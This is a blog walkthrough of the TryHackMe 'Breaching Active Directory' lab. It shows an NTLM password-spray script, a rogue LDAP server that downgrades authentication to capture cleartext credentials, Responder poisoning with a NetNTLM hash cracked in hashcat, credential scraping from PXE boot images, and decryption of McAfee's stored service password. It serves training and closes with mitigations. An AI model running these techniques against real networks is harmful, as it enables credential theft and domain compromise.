---
published: true
---
Walkthrough of Breaching Active Directory on TryHackMe coving topics of Rough LDAP Servers to capture Credentials, Authentication Relays using Responder and Recovering image passwords within PXE Boot Images from Microsoft Deployment Toolkit.

----------

Legal Notice && Usage: *The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.* *By continuing, you acknowledge the aforementioned user risk/responsibilities.*

----------


# Introduction to AD Breaches

**Learning Objectives**

In this network, we will cover several methods that can be used to breach AD. This is by no means a complete list as new methods and techniques are discovered every day. However, we will  cover the following techniques to recover AD credentials in this network:

- NTLM Authenticated Services
- LDAP Bind Credentials
- Authentication Relays
- Microsoft Deployment Toolkit
- Configuration Files

**Configure DNS**

`/etc/systemd/resolved.conf`

Set the DNS as the THMDC on the network diagram.

![Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled.png]

# OSINT and Phishing

**OSINT**

OSINT is used to discover information that has been publicly disclosed. In terms of AD credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

By using OSINT techniques, it may be possible to recover publicly disclosed credentials. If we are lucky enough to find credentials, we will still need to find a way to test whether they are valid or not since OSINT information can be outdated. In Task 3, we will talk about NTLM Authenticated Services, which may provide an excellent avenue to test credentials to see if they are still valid.

A detailed room on Red Team OSINT can be found [here.](https://tryhackme.com/jr/redteamrecon)

**Phishing**

is another excellent method to breach AD. Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background. This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account. This is why phishing is such a big topic for both Red and Blue teams.

A detailed room on phishing can be found [here.](https://tryhackme.com/module/phishing)

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%201.png)

# NTLM Authenticated Services

**NTLM and NetNTLM**

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%202.png)

**Python3 NTLM Password Spray Script**

```powershell
#!/usr/bin/python3

def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found") ****
```

execute password spray:

```bash
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>

We provide the following values for each of the parameters:

<userfile> - Textfile containing our usernames - "usernames.txt"
<fqdn> - Fully qualified domain name associated with the organisation that we are attacking - "za.tryhackme.com"
<password> - The password we want to use for our spraying attack - "Changeme123"
<attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.za.tryhackme.com"

python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

results:

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%203.png)

# LDAP Bind Credentials

**LDAP**

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%204.png)

**Access Printer Site**

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%205.png)

Setup Listener to locally on port 389 LDAP to see if cleartext password will be transmitted.

`nc -lvnp 389`

returned response after test:

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%206.png)

`supportedCapabilities` 
response tells us we have a problem. Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details.

## Hosting Rogue LDAP Server

**Installation**

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`

You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:

```
sudo dpkg-reconfigure -p low slapd
```

Make sure to press <No> when requested if you want to skip server configuration:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png)

For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png)

Use this same name for the Organisation name as well:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png)

Provide any Administrator password:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png)

Select MDB as the LDAP database to use:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)

For the last two options, ensure the database is not removed when purged:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png)

Move old database files before a new one is created:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png)

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

olcSaslSecProps.ldif

```
#olcSaslSecProps.ldifdn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

We can verify that our rogue LDAP server's configuration has been applied using the following command:

LDAP search to verify supported authentication mechanisms

```
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanismsdn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

## Capturing LDAP Credentials - Rouge LDAP Server

With rouge LDAP server running: `service slapd start`

**Downgrade PLAIN, LOGIN**

create file: `olcSaslSecProps.ldif`

```bash
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Now we can use the ldif file to patch our LDAP server using the following:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Test LDAP for modification

```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%207.png)

**Setup TCPDump for port 389**

`tcpdump -SX -i eth0 tcp port 389`

captured downgraded password:

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%208.png)

# Authentication Relays

Continuing with attacks that can be staged from our rogue device, we will now look at attacks against broader network authentication protocols. In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network.

These services have to use built-in authentication methods to verify the identity of incoming connections. In Task 2, we explored NTLM Authentication used on a web application. In this task, we will dive a bit deeper to look at how this authentication looks from the network's perspective. However, for this task, we will focus on NetNTLM authentication used by SMB.

## Server Message Block

The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.

However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

- Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
- We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target serve

## LLMNR, NBT-NS, and WPAD

In this task, we will take a bit of a look at the authentication that occurs during the use of SMB. We will use Responder to attempt to intercept the NetNTLM challenge to crack it. There are usually a lot of these challenges flying around on the network. Some security solutions even perform a sweep of entire IP ranges to recover information from hosts. Sometimes due to stale DNS records, these authentication challenges can end up hitting your rogue device instead of the intended host.

Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Servier (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device would also receive these requests. Usually, these requests would simply be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

## Intercepting NetNTLM Challenge

One thing to note is that Responder essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network. Since we are connected via a VPN to the network, we will only be able to poison authentication challenges that occur on this VPN network. For this reason, we have simulated an authentication request that can be poisoned that runs every 30 minutes. This means that you may have to wait a bit before you can intercept the NetNTLM challenge.

Although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.

Responder has already been installed on the AttackBox. However, if you are not using the AttackBox, you can download and install it from this repo:  [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder). We will set Responder to run on the interface connected to the VPN:

`sudo responder -I tun0`

## **Relaying the Challenge**

In some instances, however, we can take this a step further by trying to relay the challenge instead of just capturing it directly. This is a little bit more difficult to do without prior knowledge of the accounts since this attack depends on the permissions of the associated account. We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.
- The associated account needs the relevant permissions on the server to access the requested resources. Ideally, we are looking to relay the challenge of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
- Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD using another method and then perform enumeration to determine the privileges associated with the account you have compromised. From here, you can usually perform lateral movement for privilege escalation across the domain. However, it is still good to fundamentally under how a relay attack works, as shown in the diagram below:

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%209.png)

**Captured credentials**

```bash
svcFileCopy::ZA:e261928ca30f5e29:BE3D696BEC42658212EF4B4982B8F673:010100000000000080AC57F79A8CD801E31FADBAFDFFF2780000000002000800440055003800330001001E00570049004E002D004A00340042004D00530038005200450053004400470004003400570049004E002D004A00340042004D0053003800520045005300440047002E0044005500380033002E004C004F00430041004C000300140044005500380033002E004C004F00430041004C000500140044005500380033002E004C004F00430041004C000700080080AC57F79A8CD801060004000200000008003000300000000000000000000000002000002AB287CBAB8ECE256C58B5B24847ABF8148BC343A510D0222C17815DD3BB598D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320034002E00360030000000000000000000
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2010.png)

**Crack ntlm hash with hashcat**

```bash
hashcat -m 5600 hash.txt /root/Rooms/BreachingAD/task5/passwordlist.txt --force
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2011.png)

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2012.png)

# Microsoft Deployment Toolkit

Large organizations need tools to deploy and manage the infrastructure of the estate. In massive organizations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD.

## MDT and SCCM

Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). Large organizations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

Usually, MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. Essentially it allows the IT team to preconfigure and manage boot images. Hence, if they need to configure a new machine, they just need to plug in a network cable, and everything happens automatically. They can make various changes to the boot image, such as already installing default software like Office365 and the organization's anti-virus of choice. It can also ensure that the new build is updated the first time the installation runs.

SCCM can be seen as almost an expansion and the big brother to MDT. What happens to the software after it is installed? Well, SCCM does this type of patch management. It allows the IT team to review available updates to all software installed across the estate. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines. It makes the life of the IT team significantly easier.

However, anything that provides central management of infrastructure such as MDT and SCCM can also be targeted by attackers in an attempt to take over large portions of critical functions in the estate. Although MDT can be configured in various ways, for this task, we will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot.

**PXE Boot**

Large organizations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below**:**

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2013.png)

Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

In this task, we will focus on the latter. We will attempt to recover the deployment service account associated with the MDT service during installation for this password scraping attack. Furthermore, there is also the possibility of retrieving other AD accounts used for the unattended installation of applications and services.

**PXE Boot Image Retrieval**

Since DHCP is a bit finicky, we will bypass the initial steps of this attack. We will skip the part where we attempt to request an IP and the PXE boot preconfigure details from DHCP. We will perform the rest of the attack from this step in the process manually.

The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server. In our case, you can recover that information from the TryHackMe network diagram.

The second piece of information you would have received was the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture. To retrieve this information, you will need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2014.png)

Usually, you would use TFTP to request each of these BCD files and enumerate the configuration for all of them. However, in the interest of time, we will focus on the BCD file of the **x64**
 architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder `x64{7B...B3}.bcd`
 since the files and their names are regenerated by MDT every day. Each time you see this placeholder, remember to replace it with your specific BCD filename.

With this initial information now recovered from DHCP (wink wink), we can enumerate and retrieve the PXE Boot image. We will be using our SSH connection on THMJMP1 for the next couple of steps, so please authenticate to this SSH session using the following:

`ssh thm@THMJMP1.za.tryhackme.com`

and the password of `Password1@`.

To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:

**Setup Enviorment**

```bash
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

**Transfer x64 .bcd to Server**

```bash
Find THMMDT IP = nslookup thmmdt.za.tryhackme.com

C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2015.png)

**Access .bcd file**

```bash
PS C:\Users\thm\Documents\exec> Import-Module .\PowerPXE.ps1
PS C:\Users\thm\Documents\exec> $BCDFile = "conf.bcd"
PS C:\Users\thm\Documents\exec> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd 
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
\Boot\x64\Images\LiteTouchPE_x64.wim
```

**Download the fully bootable Windows Image**

```bash
tftp -i 100.200.26.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

## Recovering Credentials from a PXE Boot Image

Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine. If you are interested in learning more about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.

Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:

```bash
Get-FindCredentials -WimFile pxeboot.wim
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2016.png)

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2017.png)

# Configuration Files

The last enumeration avenue we will explore in this network is configuration files. Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration:

- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.

**Configuration File Credentials**

However, we will focus on recovering credentials from a centrally deployed application in this task. Usually, these applications need a method to authenticate to the domain during both the installation and execution phases. An example of such as application is McAfee Enterprise Endpoint Security, which organisations can use as the endpoint detection and response tool for security.

McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db. This database file can be retrieved and read with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.

The ma.db file is stored in a fixed location:

**Copy .md file locally**

```bash
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

[pass=Password1@]
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2018.png)

**Open file with sqlite browser**

```bash
sqlitebrowser ma.db
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2019.png)

these entries. However, the AUTH_PASSWD field is encrypted. Luckily, McAfee encrypts this field with a known key. Therefore, we will use the following old python2 script to decrypt the password. The script has been provided as a downloadable task file or on the AttackBox, it can be found in the`/root/Rooms/BreachingAD/task7/`
 directory.

**Focused Fields to Decrypt**

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2020.png)

**Decrypt Field with Tool**

```bash
cd /root/Rooms/BreachingAD/task7/
unzip mcafeesitelistpwddecryption.zip\
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2021.png)

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2022.png)

# Conclusion

A significant amount of attack avenues can be followed to breach AD. We covered some of those commonly seen being used during a red team exercise in this network. Due to the sheer size of the attack surface, new avenues to recover that first set of AD credentials are constantly being discovered. Building a proper enumeration methodology and continuously updating it will be required to find that initial pair of credentials.

**Mitigations**

In terms of mitigations, there are some steps that organisations can take:

- User awareness and training - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface.
- Limit the exposure of AD services and applications online - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.
- Enforce Network Access Control (NAC) - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted.
- Enforce SMB Signing - By enforcing SMB signing, SMB relay attacks are not possible.
- Follow the principle of least privileges - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced.

Now that we have breached AD, the next step is to perform enumeration of AD to gain a better understanding of the domain structure and identify potential misconfigurations that can be exploited. This will be covered in the next room. Remember to clear the DNS configuration!

![Untitled](Breaching%20Active%20Directory%20baa2d85bbffe47caaca9f296e2b90f7b/Untitled%2023.png)
